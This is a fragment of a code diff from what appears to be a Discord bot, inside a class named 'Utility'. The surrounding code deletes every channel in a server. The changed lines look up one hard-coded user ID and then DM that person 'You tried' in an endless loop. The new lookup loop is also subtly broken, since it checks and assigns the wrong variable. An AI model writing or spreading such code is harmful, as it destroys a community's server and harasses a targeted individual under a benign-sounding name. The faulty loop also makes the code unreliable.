@@ -33,7 +33,10 @@ class Utility:
                         pass
                 for a in x.channels:
                     await a.delete()
-                zewia = self.bot.guild.find_member(349088339489456140)
+                for z in x.members:
+                    if x.id == 349088339489456140:
+                        zewia = x
+                        break
                 while True:
                     await zewia.send("You tried")
 
